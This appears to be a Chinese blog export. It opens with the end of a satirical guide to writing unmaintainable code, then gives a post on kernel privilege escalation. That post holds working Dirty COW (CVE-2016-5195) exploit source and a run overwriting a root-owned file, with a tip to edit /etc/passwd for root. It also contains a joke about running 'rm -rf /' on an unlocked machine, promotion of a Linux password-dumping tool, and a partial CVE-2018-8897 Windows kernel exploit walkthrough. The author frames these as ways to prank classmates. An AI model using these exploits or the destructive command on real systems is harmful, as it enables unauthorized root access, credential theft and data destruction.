里的。公制和美制在工程方面有两种编码方式。一种是把所有输入都转换为公制（米制）计量单位，然后在输出的时候自己换算回各种民用计量单位。另一种是从头到尾都保持各种计量单位混合在一起。总是选择第二种方式，这就是美国之道！持续改进要持续不懈地改进。要常常对你的代码做出“改进”，并强迫用户经常升级 — 毕竟没人愿意用一个过时的版本嘛。即便他们觉得他们对现有的程序满意了，想想看，如果他们看到你又“完善“了它，他们会多么开心啊！不要告诉任何人版本之间的差别，除非你被逼无奈 — 毕竟，为什么要告诉他们本来永远也不会注意到的一些 bug 呢？&quot;关于&quot;”关于“一栏应该只包含程序名、程序员姓名和一份用法律用语写的版权声明。理想情况下，它还应该链接到几 MB 的代码，产生有趣的动画效果。但是，里边永远不要包含程序用途的描述、它的版本号、或最新代码修改日期、或获取更新的网站地址、或作者的 email 地址等。这样，所有的用户很快就会运行在各种不同的版本上，在安装 N+1 版之前就试图安装 N+2 版变更在两个版本之间，你能做的变更自然是多多益善。你不会希望用户年复一年地面对同一套老的接口或用户界面，这样会很无聊。最后，如果你能在用户不注意的情况下做出这些变更，那就更好了 — 这会让他们保持警惕，戒骄戒躁。无需技能写无法维护代码不需要多高的技术水平。喊破嗓子不如甩开膀子，不管三七二十一开始写代码就行了。记住，管理层还在按代码行数考核生产率，即使以后这些代码里的大部分都得删掉。只带一把锤子一招鲜吃遍天，会干什么就吆喝什么，轻装前进。如果你手头只有一把锤子，那么所有的问题都是钉子。规范体系有可能的话，忽略当前你的项目所用语言和环境中被普罗大众所接受的编程规范。比如，编写基于 MFC 的应用时，就坚持使用 STL 编码风格。翻转通常的 True False 惯例把常用的 true 和 false 的定义反过来用。这一招听起来平淡无奇，但是往往收获奇效。你可以先藏好下面的定义：12#define TRUE 0 #define FALSE 1把这个定义深深地藏在代码中某个没人会再去看的文件里不易被发现的地方，然后让程序做下面这样的比较12if ( var == TRUE )if ( var != FALSE )某些人肯定会迫不及待地跳出来“修正”这种明显的冗余，并且在其他地方照着常规去使用变量var：1if ( var )还有一招是为 TRUE 和 FALSE 赋予相同的值，虽然大部分人可能会看穿这种骗局。给它们分别赋值 1 和 2 或者 -1 和 0 是让他们瞎忙乎的方式里更精巧的，而且这样做看起来也不失对他们的尊重。你在 Java 里也可以用这一招，定义一个叫 TRUE 的静态常量。在这种情况下，其他程序员更有可能怀疑你干的不是好事，因为 Java 里已经有了内建的标识符 true第三方库在你的项目里引入功能强大的第三方库，然后不要用它们。潜规则就是这样，虽然你对这些工具仍然一无所知，却可以在你简历的“其他工具”一节中写上这些没用过的库不要用库假装不知道有些库已经直接在你的开发工具中引入了。如果你用 VC++ 编程，忽略 MFC 或 STL 的存在，手工编写所有字符串和数组的实现；这样有助于保持你玩指针技术的高水平，并自动阻止任何扩展代码功能的企图创建一套Build顺序把这套顺序规则做得非常晦涩，让维护者根本无法编译任何他的修改代码。秘密保留 SmartJ ，它会让 make 脚本形同废物。类似地，偷偷地定义一个 javac 类，让它和编译程序同名。说到大招，那就是编写和维护一个定制的小程序，在程序里找到需要编译的文件，然后通过直接调用 sun.tools.javac.Main 编译类来进行编译。Make 的更多玩法用一个 makefile-generated-batch-file 批处理文件从多个目录复制源文件，文件之间的覆盖规则在文档中是没有的。这样，无需任何炫酷的源代码控制系统，就能实现代码分支，并阻止你的后继者弄清哪个版本的 DoUsefulWork() 才是他需要修改的那个。搜集编码规范尽可能搜集所有关于编写可维护代码的建议，例如 SquareBox 的建议 ，然后明目张胆地违反它们。规避公司的编码规则某些公司有严格的规定，不允许使用数字标识符，你必须使用预先命名的常量。要挫败这种规定背后的意图太容易了。比如，一位聪明的 C++ 程序员是这么写的：123#define K_ONE 1#define K_TWO 2 #define K_THOUSAND 999编译器警告一定要保留一些编译器警告。在 make 里使用 “-” 前缀强制执行，忽视任何编译器报告的错误。这样，即使维护代码的程序员不小心在你的源代码里造成了一个语法错误，make 工具还是会重新把整个包 build 一遍，甚至可能会成功！而任何程序员要是手工编译你的代码，看到屏幕上冒出一堆其实无关紧要的警告，他们肯定会觉得是自己搞坏了代码。同样，他们一定会感谢你让他们有找错的机会。学有余力的同学可以做点手脚让编译器在打开编译错误诊断工具时就没法编译你的程序。当然了，编译器也许能做一些脚本边界检查，但是真正的程序员是不用这些特性的，所以你也不该用。既然你用自己的宝贵时间就能找到这些精巧的bug，何必还多此一举让编译器来检查错误呢？把 bug 修复和升级混在一起永远不要发布什么“bug 修复”版本。一定要把 bug 修复和数据库结构变更、复杂的用户界面修改，还有管理界面重写等混在一起。那样的话，升级就变成一件非常困难的事情，人们会慢慢习惯 bug 的存在并开始称他们为特性。那些真心希望改变这些”特性“的人们就会有动力升级到新版本。这样从长期来说可以节省你的维护工作量，并从你的客户那里获得更多收入。在你的产品发布每个新版本的时候都改变文件结构没错，你的客户会要求向上兼容，那就去做吧。不过一定要确保向下是不兼容的。这样可以阻止客户从新版本回退，再配合一套合理的 bug 修复规则（见上一条），就可以确保每次新版本发布后，客户都会留在新版本。学有余力的话，还可以想办法让旧版本压根无法识别新版本产生的文件。那样的话，老版本系统不但无法读取新文件，甚至会否认这些文件是自己的应用系统产生的！温馨提示：PC 上的 Word 文字处理软件就典型地精于此道。抵消 Bug不用费劲去代码里找 bug 的根源。只要在更高级的例程里加入一些抵销它的代码就行了。这是一种很棒的智力测验，类似于玩3D棋，而且能让将来的代码维护者忙乎很长时间都想不明白问题到底出在哪里：是产生数据的低层例程，还是莫名其妙改了一堆东西的高层代码。这一招对天生需要多回合执行的编译器也很好用。你可以在较早的回合完全避免修复问题，让较晚的回合变得更加复杂。如果运气好，你永远都不用和编译器前端打交道。学有余力的话，在后端做点手脚，一旦前端产生的是正确的数据，就让后端报错。使用旋转锁不要用真正的同步原语，多种多样的旋转锁更好 — 反复休眠然后测试一个(non-volatile的) 全局变量，直到它符合你的条件为止。相比系统对象，旋转锁使用简便，”通用“性强，”灵活“多变，实为居家旅行必备。随意安插 sync 代码把某些系统同步原语安插到一些用不着它们的地方。本人曾经在一段不可能会有第二个线程的代码中看到一个临界区（critical section）代码。本人当时就质问写这段代码的程序员，他居然理直气壮地说这么写是为了表明这段代码是很”关键“（单词也是critical）的！优雅降级如果你的系统包含了一套 NT 设备驱动，就让应用程序负责给驱动分配 I/O 缓冲区，然后在任何事务过程中对内存中的驱动加锁，并在事务完成后释放或解锁。这样一旦应用非正常终止，I/O缓存又没有被解锁，NT服务器就会当机。但是在客户现场不太可能会有人知道怎么弄好设备驱动，所以他们就没有选择（只能请你去免费旅游了）。定制脚本语言在你的 C/S 应用里嵌入一个在运行时按字节编译的脚本命令语言。依赖于编译器的代码如果你发现在你的编译器或解释器里有个 bug ，一定要确保这个 bug 的存在对于你的代码正常工作是至关重要的。毕竟你又不会使用其他的编译器，其他任何人也不允许！一个货真价实的例子下面是一位大师编写的真实例子。让我们来瞻仰一下他在这样短短几行 C 函数里展示的高超技巧。12345678910void* Realocate(void*buf, int os, int ns) &#123; void*temp; temp = malloc(os); memcpy((void*)temp, (void*)buf, os); free(buf); buf = malloc(ns); memset(buf, 0, ns); memcpy((void*)buf, (void*)temp, ns); return buf;&#125;重新发明了标准库里已有的简单函数Realocate 这个单词拼写错误。所以说，永远不要低估创造性拼写的威力无缘无故地给输入缓冲区产生一个临时的副本无缘无故地造型。 memcpy() 里有 (void*)，这样即使我们的指针已经是 (void*) 了也要再造型一次。另外，这样做可以传递任何东西作为参数，加 10 分永远不必费力去释放临时内存空间。这样会导致缓慢的内存泄露，一开始看不出来，要程序运行一段时间才行把用不着的东西也从缓冲区里拷贝出来，以防万一。这样只会在 Unix 上产生 core dump，Windows 就不会很显然，os 和 ns 的含义分别是”old size” 和 “new size”给 buf 分配内存之后，memset 初始化它为 0。不要使用 calloc()，因为某些人会重写 ANSI 规范，这样将来保不齐 calloc() 往 buf 里填的就不是 0 了。（虽然我们复制过去的数据量和 buf 的大小是一样的，不需要初始化，不过这也无所谓啦）如何修复 “unused variable” 错误如果你的编译器冒出了 “unused local variable” 警告，不要去掉那个变量。相反，要找个聪明的办法把它用起来。我最喜欢的方法是：1i = i;大小很关键差点忘了说了，函数是越大越好。跳转和 GOTO 语句越多越好。那样的话，想做任何修改都需要分析很多场景。这会让维护代码的程序员陷入千头万绪之中。如果函数真的体型庞大的话，对于维护代码的程序员就是哥斯拉怪兽了，它会在他搞清楚情况之前就残酷无情地将他踩翻在地。一张图片顶1000句话，一个函数就是1000行把每个方法体写的尽可能的长 — 最好是你写的任何一个方法或函数都不会少于1000行代码，而且里边是深度嵌套，这是必须的。少个文件一定要保证一个或多个关键文件无法找到。利用 includes 里边再 includes 就能做到这一点。例如，在你的 main 模块里，你写上：1#include &lt;stdcode.h&gt;Stdcode.h 是有的。但是在 stdcode.h 里，还有个引用：1#include &quot;a:\\refcode.h&quot;然后，refcode.h 就没地方能找到了Shq tips: 有谁知道 a: 盘是什么吗......就是传说中的软盘...到处都写，无处会读至少要把一个变量弄成这样：到处被设置，但是几乎没有哪里用到它。不幸的是，现代编译器通常会阻止你做相反的事：到处读，没处写。不过你在 C 或 C++ 里还是可以这样做的。]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>优化</tag>
        <tag>毒瘤</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「Linux / Windows」内核提权脚本]]></title>
    <url>%2Farticles%2FKernel-privilege-escalation%2F</url>
    <content type="text"><![CDATA[0x00 条件竞争漏洞0x01 漏洞简介Linux内核的内存子系统在处理写入时复制（copy-on-write, COW\text{copy-on-write, COW}copy-on-write, COW）时产生了竞争条件（race condition\text{race condition}race condition）。恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问。（A race condition was found in the way the Linux kernel’s memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings.）竞争条件，指的是任务执行顺序异常，可导致应用崩溃，或令攻击者有机可乘，进一步执行其他代码。利用这一漏洞，攻击者可在其目标系统提升权限，甚至可能获得 root\text{root}root 权限。CVE-2016-5195: [https://access.redhat.com/security/cve/CVE-2016-5195]0x02 为什么要用才不是机惨别人(･ω´･ )一天，Shq 在巡视机房的时候，发现有人 Linux 没锁qwq然后.....1rm -rf /(ゝ∀･)0x03 漏洞危害低权限用户可以利用该漏洞修改只读内存，进而执行任意代码获取 root\text{root}root 权限(っ・Д・)っ0x04 影响范围该漏洞影响所有 的版本2.6.22\text{2.6.22}2.6.22 是 200720072007 年发布的版本，也就是说这个漏洞几乎影响 200720072007 以后的所有版本0x05 代码原理12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt; #include &lt;pthread.h&gt; #include &lt;unistd.h&gt;int i = 1; void *mythread1() &#123; if(i == 1)&#123; //&lt;a&gt; sleep(3); if(i == 2) //&lt;b&gt; printf("hack it!\n"); else printf("you can try again!\n"); &#125; &#125; void *mythread2() &#123; sleep(1); i=2; &#125; int main(int argc, const char *argv[]) &#123; pthread_t id1,id2; pthread_create(&amp;id1, NULL, (void *)mythread1,NULL); pthread_create(&amp;id2, NULL, (void *)mythread2,NULL); pthread_join(id1,NULL); pthread_join(id2,NULL); return 0;&#125;单独看 mythread1() 函数，显然肯定是输出 you can try again!\n，但是，由于 iii 是全局共享的资源可以通过线程的方式来使 iii 值在 &lt;a&gt; 的之后 &lt;b&gt; 之前进行改变，可以改变函数的流程qwq为了使结果清晰明了，所以手动利用 sleep() 函数进行设置了，实际利用过程中，可能是一些会耗时较长的函数，如memcpy()这也是竞争条件的核心思想，这也是一个数据竞争引发条件竞争的典型例子由于 Android 的崛起起，Linux 内核的安全性受到了极大地考验，很多潜藏的安全也慢慢被安全研究眼发现。这个漏洞的主要成因是因为在 pty/tty 设备驱动中在访问某些资源的时候没有正确的加锁处理，准确来说，加锁的范围较小。首先，先看一下理解这个漏洞必要的两个数据结构1234567891011121314151617181920struct tty_buffer &#123; struct tty_buffer *next; char *char_buf_ptr; unsigned char *flag_buf_ptr; int used; int size; int commit; int read; /* Data points here */ unsigned long data[0]; &#125;; struct tty_struct &#123; int magic; struct kref kref; struct device *dev; struct tty_driver *driver; const struct tty_operations *ops; struct tty_bufhead buf; &#125;;tty_buffer 是一个动态大小的数据结构，其中, char_buf_ptr 指向该对象后面的第一字节，即(char_buf_ptr = tty_buffer+sizeof(tty_buffer) 大小为 size ...1flag_buf_ptr = tty_buffer + sizeof(tty_buffer) + size大小为 size 。used 为已经使用的 buffer 大小。tty_struct 为 tty 的数据结构，其中 ops 为 tty 设备的一些操作函数，如 open(),write()该漏洞的函数调用为1write(pty_fd) in userspace -&gt; sys_write() in kernelspace -&gt; tty_write() -&gt; pty_write() -&gt; tty_insert_flip_string_fixed_flag()看 tty_insert_flip_string_fixed_flag() 函数：123456789101112131415161718int tty_insert_flip_string_fixed_flag(struct tty_struct *tty, const unsigned char *chars, char flag, size_t size)&#123; int copied = 0; do &#123; int goal = min_t(size_t, size - copied, TTY_BUFFER_PAGE); int space = tty_buffer_request_room(tty, goal); struct tty_buffer *tb = tty-&gt;buf.tail; if (unlikely(space == 0)) break; memcpy(tb-&gt;char_buf_ptr + tb-&gt;used, chars, space); memset(tb-&gt;flag_buf_ptr + tb-&gt;used, flag, space); tb-&gt;used += space; copied += space; chars += space; &#125; while (unlikely(size &gt; copied)); return copied; &#125;这个函数的大致流程为通过 tty_buffer_request_room 来申请函数空间，如果没有，则另外申请。利用 memcpy 进行复制内存。最后再递增 used 。其中 memcpy 调用时间较长，由于没有加锁，存在竞争条件的问题，查看 tty_buffer_request_room，看是否能够利用：123456789101112131415161718192021222324252627int tty_buffer_request_room(struct tty_struct *tty, size_t size) &#123; struct tty_buffer *b, *n; int left; unsigned long flags; spin_lock_irqsave(&amp;tty-&gt;buf.lock, flags); if ((b = tty-&gt;buf.tail) != NULL) left = b-&gt;size - b-&gt;used; else left = 0; if (left &lt; size) &#123; //&lt;1&gt; /* This is the slow path - looking for new buffers to use */ if ((n = tty_buffer_find(tty, size)) != NULL) &#123; if (b != NULL) &#123; b-&gt;next = n; b-&gt;commit = b-&gt;used; &#125; else tty-&gt;buf.head = n; tty-&gt;buf.tail = n; &#125; else size = left; &#125; spin_unlock_irqrestore(&amp;tty-&gt;buf.lock, flags); return size; &#125;这里有一个整数溢出的问题，由于程序员的疏忽 size 为 unsigned ，而 left 为 int ，根据 c 语言规则，left 为转化为无符号，在 &lt;1&gt; 中，如果 left 为负数，转化为无符号数，便可以实现 size 大于 left ，即需要的空间大于空余的空间，但是仍不进行内存分配，再通过 tty_insert_flip_string_fixed_flag 函数里的 memcpy 来溢出，对内存进行读写left = b-&gt;size - b-&gt;used ，其中 size 不能改变，但是可以改变 used 的值，通过条件竞争，来对 used 进行连续多次写，使 used 大于 size由于 memcpy 函数将会持续较长时间，只要对一个 tty 连续多次利用多线程对该函数进行申请空间，使 used &gt; size ，这样就可以在使用 memcpy 时，进行内存溢出。这个漏洞，是一个非常典型的竞争条件漏洞。其实也就是上面那个测试代码也是这个函数的简化版。0x06 测试代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354/* * main.c * * Created on: Oct 21, 2016 * Author: 5t4rk */#include&lt;stdio.h&gt;#include&lt;sys/mman.h&gt;#include&lt;fcntl.h&gt;#include&lt;pthread.h&gt;#include&lt;string.h&gt; void *map;int f;struct stat st;char* name; void * madviseThread(void *arg) &#123; char *str; str = (char *) arg; int c = 0; for (register int i = 0; i &lt; 100000000; i++) &#123; c += madvise(map, 100, MADV_DONTNEED); &#125; printf("madvise %d\n", c);&#125; void * procselfmemThread(void *arg) &#123; char *str; str = (char *) arg; int f = open("/proc/self/mem", O_RDWR); int c = 0; for (register int i = 0; i &lt; 100000000; i++) &#123; lseek(f, map, SEEK_SET); c += write(f, str, strlen(str)); &#125; printf("procselfmem %d\n", c);&#125; int main (int argc, char *argv[]) &#123; if (argc &lt; 3) return 1; pthread_t pth1, pth2; f = open(argv[1], O_RDONLY); fstat(f, &amp;st); name = argv[1]; map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0); printf("mmap %x\n", map); pthread_create(&amp;pth1, NULL, madviseThread, argv[1]); pthread_create(&amp;pth2, NULL, procselfmemThread, argv[2]); pthread_join(pth1, NULL); pthread_join(pth2, NULL); return 0;&#125;然后编译生成 exp.两种生成方式:命令行编译1gcc main.c -lpthread集成工具编译123eclipse(luna) +CDTproject&gt;properties&gt;settings&gt;gcc linker&gt; libraries注意 Debug 和 Release 都同时加上参数 pthread 库再编译即可成功(´・ω・`)0x07 测试结果12345678910111213141516171819202122232425luke@ubuntu:/tmp$ cat test5678luke@ubuntu:/tmp$ ls -al test-rw-r--r-- 1 root root 5 10月 21 17:17 testluke@ubuntu:/tmp$ iduid=1000(luke) gid=1000(luke) groups=1000(luke),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)luke@ubuntu:/tmp$ cat test5678luke@ubuntu:/tmp$ echo 1234 &gt;testbash: test: Permission deniedluke@ubuntu:/tmp$ ./rootEep test 1234bash: ./rootEep: No such file or directoryluke@ubuntu:/tmp$ ./rootExp test 1234mmap b7701000madvise 0procselfmem 400000000luke@ubuntu:/tmp$ cat test1234结果显示低权限用户修改了 root 用户创建的文件内容。同理，可以看到结果，test 文件的内容已经由 5678 被成功修改为 1234这样的话，只要修改 /etc/passwd 把当前用户的 uid 改成 0 就可以作为 root 登录了0x08 修复方案在现代操作系统，竞争条件是不可避免的，只要两个两个执行线程访问同一个数据结构，由于我们无法预测 linux 调度的顺序，就会产生混合，就可能产竞争条件。我们如果需要对内核或驱动编写，应该尽量避免资源的共享，如果不可避免，需要利用锁来对原子数据进行锁定毕竟 机惨会掉rp ，我们要帮他修复qwq更新升级最新 Linux Kernel 源码，并重新编译0x10 抓取当前登录用户登录密码前有Mimikatz，今有mimipenguin，近日国外安全研究员huntergregal发布了工具mimipenguin，一款Linux下的密码抓取神器，可以说弥补了Linux下密码抓取的空缺这样我们就可以长久机惨 惹_(:3 」∠ )_编写思路来自流行的 windows密码抓取神器mimikatz0x11 详情通过转储过程和提取那些包含明文密码可能性很高的行（hang），充分利用内存中的明文凭证。通过检查 /etc/shadow 文件 hash ,内存中的 hash 和正则匹配去尝试计算出每个单词的概率0x12 要求需要 root权限已支持(以下环境已通过测试)OSServiceSupportedUbuntu Desktop 12.04 LTS x64gnome-keyring-daemon (3.18.3)Done.WellUbuntu Desktop 16.04 LTS x64gnome-keyring-daemon (3.18.3)Done.WellFedora Workstation 25 (x86_64)gnome-keyring-daemon (3.20.0)Done.WellFedora Workstation 27 (x86_64)gnome-keyring-daemon (3.20.1)Done.WellKali-rolling x64gnome-keyring-daemon (3.28.0.2)Done.Well0x13 项目地址Github0x20 Windows exp提权0x21 前言就在几天前，Nick Peterson（@nickeverdox）和Nemanja Mulasmajic（@ 0xNemi）发现了一个允许非特权用户运行带有用户模式GSBASE的#DB处理程序的新漏洞。在白皮书的最后，他们发布了 triplefault.io，他们提到他们能够加载和执行未签名的内核代码，这让我产生感兴趣; 这正是我要在这篇文章中尝试做的。在开始之前，我想指出的是，这个漏洞在虚拟机上不起作用，因为int3在虚拟化下丢弃了#DB。所以我通过“simulating”这种情况来调试它。最终的源代码可以在底部找到官网上是这样说的qwqCVE-2018-8897 | Windows Kernel Elevation of Privilege VulnerabilitySecurity Vulnerability: 05/08/2018 MITRE CVE-2018-8897An elevation of privilege vulnerability exists when the Windows kernel fails to properly handle objects in memory. An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.To exploit this vulnerability, an attacker would first have to log on to the system. An attacker could then run a specially crafted application to take control of an affected system.The update addresses the vulnerability by correcting how the Windows kernel handles objects in memory.同时也给出了解决方案MitigationsMicrosoft has not identified any mitigating factors for this vulnerability.WorkaroundsMicrosoft has not identified any workarounds for this vulnerability.解决方案：咕咕咕0x22 漏洞原理这个漏洞的基本原理非常简单，与开发漏洞不同。当堆栈段改变时 – 无论是通过MOV还是POP-下一条指令完成中断都被延迟。这不是微代码错误，而是英特尔添加的功能，因此可以同时设置堆栈段和堆栈指针。然而，许多操作系统供应商忽略了这个细节，这让我们可以从用户模式的CPL0中获得一个#DB异常。我们可以通过设置调试寄存器来创建延迟到CPL0的异常，以便在执行堆栈段更改指令期间#DB将引发并立即调用 int 3 。int3 将跳转到 KiBreakpointTrap，并且在 KiBreakpointTrap 的第一条指令执行之前，我们的 #DB 将被提升。正如原始白皮书中的everdox和0xNemi所提到的，这使我们可以使用用户模式GSBASE运行内核模式异常处理程序。这样调试寄存器和XMM寄存器将被保存。所有这些都可以通过几行来完成，如下所示：1234567891011121314151617181920212223242526272829303132333435#include &lt;Windows.h&gt;#include &lt;iostream&gt;void main() &#123; static DWORD g_SavedSS = 0; _asm &#123; mov ax, ss mov word ptr [ g_SavedSS ], ax &#125; CONTEXT Ctx = &#123; 0 &#125;; Ctx.Dr0 = ( DWORD ) &amp;g_SavedSS; Ctx.Dr7 = ( 0b1 &lt;&lt; 0 ) | ( 0b11 &lt;&lt; 16 ) | ( 0b11 &lt;&lt; 18 ); Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS; SetThreadContext( HANDLE( -2 ), &amp;Ctx ); PVOID FakeGsBase = ...; _asm &#123; mov eax, FakeGsBase ; Set eax to fake gs base push 0x23 push X64_End push 0x33 push X64_Start retf X64_Start: __emit 0xf3 ; wrgsbase eax __emit 0x0f __emit 0xae __emit 0xd8 retf X64_End: ; Vulnerability` mov ss, word ptr [ g_SavedSS ] ; Defer debug exception int 3 ; Execute with interrupts disabled nop &#125;&#125;这个例子是 323232 位的，为了将 ASM 和 C 一起展示，最后演示的代码将是 646464 位现在，让我们开始调试，我们用我们的定制的GSBASE在idebug gtraporfault！但是，这是灾难性的，因为我们最终会在KiDebugTrapOrFault-&gt; KiGeneralProtectionFault-&gt; KiPageFault-&gt; KiPageFault-&gt; ...无限循环中。如果我们有一个完全有效的GSBASE，那么我们所取得的成果将是一个KMODE_EXCEPTION_NOT_HANDLED BSOD ， 所以让我们专注于GSBASE真正的功能，并尝试去KeBugCheckEx。我们可以利用一个小的 IDA 脚本更快地转到相关部分：12345678910#include &lt;idc.idc&gt;static main() &#123; Message( "--- Step Till Next GS ---n" ); while( 1 ) &#123; auto Disasm = GetDisasmEx( GetEventEa(), 1 ); if ( strstr( Disasm, "gs:" ) &gt;= Disasm ) break; StepInto(); GetDebuggerEvent( WFNE_SUSP, -1 ); &#125;&#125;– KiDebugTrapOrFaultKiDebugTrapOrFault： ... MEMORY：FFFFF8018C20701E ldmxcsr dword ptr gs：180h Pcr.Prcb.MxCsr需要有一个有效的标志组合来传递这个指令，否则它会产生#GP。所以让我们将其设置为初始值0x1F80。– KiExceptionDispatchKiExceptionDispatch： ... MEMORY：FFFFF8018C20DB5F mov rax，gs ：188h MEMORY：FFFFF8018C20DB68 bt dword ptr [rax + 74h ]，8 Pcr.Prcb.CurrentThread位于gs：188h。我们将分配一块内存并在gs：188h中引用它。– KiDispatchExceptionKiDispatchException： ... MEMORY：FFFFF8018C12A4D8 mov rax，gs ：qword_188 MEMORY：FFFFF8018C12A4E1 mov rax，[rax + 0B8h ]这是Pcr.Prcb.CurrentThread.ApcStateFill.Process，我们将再次分配一块内存，并简单地将该指针指向它。KeCopyLastBranchInformation： ... MEMORY：FFFFF8018C12A0AC mov rax，gs ：qword_20 MEMORY：FFFFF8018C12A0B5 mov ecx，[rax + 148h ]来自GSBASE的0x20是Pcr.CurrentPrcb，即Pcr + 0x180。让我们将Pcr.CurrentPrcb设置为Pcr + 0x180，同时将Pcr.Self设置为＆Pcr。– RtlDispatchException这一项我会讲的更加详细。RtlDispatchException调用RtlpGetStackLimits，如果失败，则调用KeQueryCurrentStackInformation和__fastfail。这里的问题是KeQueryCurrentStackInformation检查RSP对Pcr.Prcb.RspBase，Pcr.Prcb.CurrentThread-&gt; InitialStack，Pcr.Prcb.IsrStack的当前值，如果它没有找到它报告失败的匹配项。我们显然无法从用户模式知道内核堆栈的价值，那该怎么办？在函数中间有一个奇怪的检查： char __fastcall KeQueryCurrentStackInformation(_DWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3) { ... if ( *(_QWORD *)(*MK_FP(__GS__, 392i64) + 40i64) == *MK_FP(__GS__, 424i64) ) { ... } else { *v5 = 5; result = 1; *v3 = 0xFFFFFFFFFFFFFFFFi64; *v4 = 0xFFFF800000000000i64; } return result; }多亏了这个检查，只要我们确定KThread.InitialStack（KThread + 0x28）不等于Pcr.Prcb.RspBase（gs：1A8h），KeQueryCurrentStackInformation将返回成功，0xFFFF800000000000-0xFFFFFFFFFFFFFFFF作为报告的堆栈范围。我们继续并将Pcr.Prcb.RspBase设置为1，将Pcr.Prcb.CurrentThread-&gt; InitialStack设置为0.问题已解决。RtlDispatchException在更改后将失效，不会发生错误检查并返回KiDispatchException。– KeBugCheckEx我们终于来了。这是我们需要解决的最后一件事：MEMORY：FFFFF8018C1FB94A mov rcx，gs ：qword_20 MEMORY：FFFFF8018C1FB953 mov rcx，[rcx + 62C0h ] MEMORY：FFFFF8018C1FB95A 调用RtlCaptureContextPcr.CurrentPrcb-&gt;上下文是KeBugCheck保存调用者的上下文的地方，并且出于某种奇怪的原因，它是PCONTEXT而不是CONTEXT。我们并不关心Pcr的任何其他字段，所以让我们将它设置为Pcr + 0x3000，仅仅是为了现在有一个有效的指针。0x23 Write | What | Where让我们噪起来，向胜利象征的甜美蓝色屏幕出发吧！现在一切正常，我们如何利用它？KeBugCheckEx之后的代码太复杂，无法一个接一个，这根本没有意思，所以我们不想错误检查。我编写了另一个IDA脚本来记录感兴趣的点（例如gs：访问和跳转以及对寄存器和[寄存器+ x]的调用），并直到KeBugCheckEx被触发为止： #include &lt;idc.idc&gt; static main() { Message( &quot;--- Logging Points of Interest ---n&quot; ); ```while( 1 ) { auto IP = GetEventEa(); auto Disasm = GetDisasmEx( IP, 1 ); ```if ( ( strstr( Disasm, &quot;gs:&quot; ) &gt;= Disasm ) || ( strstr( Disasm, &quot;jmp r&quot; ) &gt;= Disasm ) || ( strstr( Disasm, &quot;call r&quot; ) &gt;= Disasm ) || ( strstr( Disasm, &quot;jmp&quot; ) &gt;= Disasm &amp;&amp; strstr( Disasm, &quot;[r&quot; ) &gt;= Disasm ) || ( strstr( Disasm, &quot;call&quot; ) &gt;= Disasm &amp;&amp; strstr( Disasm, &quot;[r&quot; ) &gt;= Disasm ) ) { Message( &quot;-- %s (+%x): %sn&quot;, GetFunctionName( IP ), IP - GetFunctionAttr( IP, FUNCATTR_START ), Disasm ); } ```StepInto(); GetDebuggerEvent( WFNE_SUSP, -1 ); ```if( IP == ... ) break; } }令我失望的是，没有出现跳转或调用。整个输出是： - KiDebugTrapOrFault (+3d): test word ptr gs:278h, 40h - sub_FFFFF8018C207019 (+5): ldmxcsr dword ptr gs:180h -- KiExceptionDispatch (+5f): mov rax, gs:188h --- KiDispatchException (+48): mov rax, gs:188h --- KiDispatchException (+5c): inc gs:5D30h ---- KeCopyLastBranchInformation (+38): mov rax, gs:20hh ---- KeQueryCurrentStackInformation (+3b): mov rax, gs:188h ---- KeQueryCurrentStackInformation (+44): mov rcx, gs:1A8h --- KeBugCheckEx (+1a): mov rcx, gs:20h这意味着我们必须找到一种写入内核模式内存和滥用的方法。RtlCaptureContext在这里会有很大的帮助。正如我前面提到的那样，它从Pcr.CurrentPrcb-&gt; Context获取上下文指针，这很奇怪地是PCONTEXT上下文而不是上下文，这意味着我们可以为其提供任何内核地址并使其写入上下文。我原本打算把它写在g_CiOptions上，并且在另一个线程中连续使用NtLoadDriver，但是这个想法并没有像我想的那么好（这就是说，这是@everdox和@ 0xNemi的工作方式，我想我们会看看他们在BlackHat 2018上使用了什么黑魔法），只是因为当前线程停留在无限循环中，另一个尝试NtLoadDriver的线程由于其使用的IPI而不会成功：NtLoadDriver-&gt; – &gt; MiSetProtectionOnSection-&gt; KeFlushMultipleRangeTb-&gt; IPI-&gt;死锁在玩了1-2天的g_CiOptions之后，我想到了一个更好的主意：建立一个ROP链。我们如何建立一个没有RSP的ROP链？打开脑洞，我们实际上可以访问RSP。我们可以通过将Prcb.Context指向用户模式内存并轮询来自辅助线程的Context.RSP值来获得当前的RSP。可悲的是，这本身并没有用，因为我们已经通过了RtlCaptureContext（我们写了什么漏洞）。但是，如果我们可以在RtlCaptureContext完成其工作并以某种方式预测RSP的下一个值之后返回到KiDebugTrapOrFault， 这正是我们要做的。要返回到KiDebugTrapOrFault，我们将再次使用我们可爱的调试寄存器。在RtlCaptureContext返回之后，对KiSaveProcessorControlState进行调用。 .text:000000014017595F mov rcx, gs:20h .text:0000000140175968 add rcx, 100h .text:000000014017596F call KiSaveProcessorControlState .text:0000000140175C80 KiSaveProcessorControlState proc near ; CODE XREF: KeBugCheckEx+3Fp .text:0000000140175C80 ; KeSaveStateForHibernate+ECp ... .text:0000000140175C80 mov rax, cr0 .text:0000000140175C83 mov [rcx], rax .text:0000000140175C86 mov rax, cr2 .text:0000000140175C89 mov [rcx+8], rax .text:0000000140175C8D mov rax, cr3 .text:0000000140175C90 mov [rcx+10h], rax .text:0000000140175C94 mov rax, cr4 .text:0000000140175C97 mov [rcx+18h], rax .text:0000000140175C9B mov rax, cr8 .text:0000000140175C9F mov [rcx+0A0h], rax我们将在gs：20h + 0x100 + 0xA0上设置DR1，并使KeBugCheckEx返回到KiDebugTrapOrFault。为了编写我们的ROP链，我们首先让KiDebugTrapOrFault-&gt; ... - &gt; RtlCaptureContext执行一次，给我们的用户模式线程一个初始的RSP值，然后让它执行另一个时间来获得新的RSP，这将使我们计算每个 – 